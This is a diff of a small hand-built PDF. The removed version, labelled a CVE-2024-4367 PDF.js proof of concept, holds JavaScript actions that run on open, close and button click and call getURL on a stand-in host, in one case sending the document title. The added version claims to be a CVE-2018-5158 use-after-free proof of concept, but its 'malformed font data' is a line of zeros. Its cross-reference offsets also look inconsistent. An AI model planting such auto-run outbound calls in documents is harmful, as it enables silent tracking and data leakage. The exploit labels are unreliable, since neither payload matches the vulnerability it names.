@@ -1,52 +1,30 @@
 %PDF-1.4
-1 0 obj << /Type /Catalog /Pages 2 0 R /Names << /JavaScript 10 0 R >> /OpenAction 11 0 R /AcroForm << /Fields [18 0 R] >> /Metadata 16 0 R /AA 20 0 R >> endobj
+1 0 obj << /Type /Catalog /Pages 2 0 R /Resources 5 0 R >> endobj
 2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj
-3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources 5 0 R /Annots [17 0 R 18 0 R] /AA 21 0 R >> endobj
+3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources 5 0 R >> endobj
 4 0 obj << /Length 68 >> stream
-BT /F1 12 Tf 100 700 Td (CVE-2024-4367 PoC for PDF.js 3.4.120) Tj 100 650 Td (Click button to test) Tj ET
+BT /F1 12 Tf 100 700 Td (CVE-2018-5158 PoC) Tj 100 650 Td (Use-After-Free Test) Tj ET
 endstream endobj
 5 0 obj << /Font << /F1 6 0 R >> >> endobj
-6 0 obj << /Type /Font /Subtype /Type1 /BaseFont /Helvetica /FontDescriptor 7 0 R /FontMatrix [1 0 0 1 0 0] >> endobj
-7 0 obj << /Type /FontDescriptor /FontName /Helvetica /Flags 32 /FontBBox [-166 -225 1000 931] /ItalicAngle 0 /Ascent 770 /Descent -230 /CapHeight 717 /StemV 88 >> endobj
-10 0 obj << /Names [(InitXSS) 11 0 R] >> endobj
-11 0 obj << /S /JavaScript /JS (getURL('https://mockendpoint.com?open=true&title=' + app.doc.title + '×tamp=2025-05-30T16:42:00EEST');) >> endobj
-16 0 obj << /Type /Metadata /Subtype /XML /Length 92 >> stream
-<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"><rdf:Description><dc:title>CVE-2024-4367 PoC PDF</dc:title></rdf:Description></rdf:RDF>
-endstream endobj
-17 0 obj << /Type /Annot /Subtype /Link /Rect [100 600 200 620] /A << /S /URI /URI[](https://example.com/test) >> /Border [0 0 1] /C [0 0 1] >> endobj
-18 0 obj << /Type /Annot /Subtype /Widget /FT /Btn /T (TestBtn) /Rect [100 550 200 570] /A << /S /JavaScript /JS (getURL('https://mockendpoint.com?click=TestBtn');) >> /AP << /N 22 0 R >> >> endobj
-20 0 obj << /O << /S /JavaScript /JS (getURL('https://mockendpoint.com?open=true');) >> /WC << /S /JavaScript /JS (getURL('https://mockendpoint.com?close=true');) >> >> endobj
-21 0 obj << /PC << /S /JavaScript /JS (getURL('https://mockendpoint.com?pageclose=true');) >> >> endobj
-22 0 obj << /Type /XObject /Subtype /Form /FormType 1 /BBox [0 0 100 20] /Resources << /Font << /F1 6 0 R >> >> /Length 58 >> stream
-0 0 100 20 re f BT /F1 10 Tf 10 10 Td (Click Me!) Tj ET 1 0 0 rg 0 0 100 20 re S
+6 0 obj << /Type /Font /Subtype /Type1 /BaseFont /Helvetica /FontDescriptor 7 0 R >> endobj
+7 0 obj << /Type /FontDescriptor /FontName /Helvetica /Flags 32 /FontBBox [-166 -225 1000 931] /ItalicAngle 0 /Ascent 770 /Descent -230 /CapHeight 717 /StemV 88 /FontFile 8 0 R >> endobj
+8 0 obj << /Length 50 >> stream
+% Malformed font data to trigger use-after-free
+00000000000000000000000000000000000000000000000000
 endstream endobj
 xref
-0 23
+0 9
 0000000000 65535 f 
 0000000010 00000 n 
-0000000095 00000 n 
-0000000152 00000 n 
-0000000213 00000 n 
-0000000295 00000 n 
-0000000333 00000 n 
-0000000445 00000 n 
-0000000000 65535 f 
-0000000000 65535 f 
-0000000531 00000 n 
-0000000576 00000 n 
-0000000000 65535 f 
-0000000000 65535 f 
-0000000000 65535 f 
-0000000847 00000 n 
-0000000939 00000 n 
-0000001031 00000 n 
-0000001133 00000 n 
-0000001235 00000 n 
-0000001337 00000 n 
-0000001439 00000 n 
-0000001541 00000 n 
+0000000075 00000 n 
+0000000132 00000 n 
+0000000193 00000 n 
+0000000275 00000 n 
+0000000313 00000 n 
+0000000425 00000 n 
+0000000537 00000 n 
 trailer
-<< /Size 23 /Root 1 0 R >>
+<< /Size 9 /Root 1 0 R >>
 startxref
-1541
+589
 %%EOF
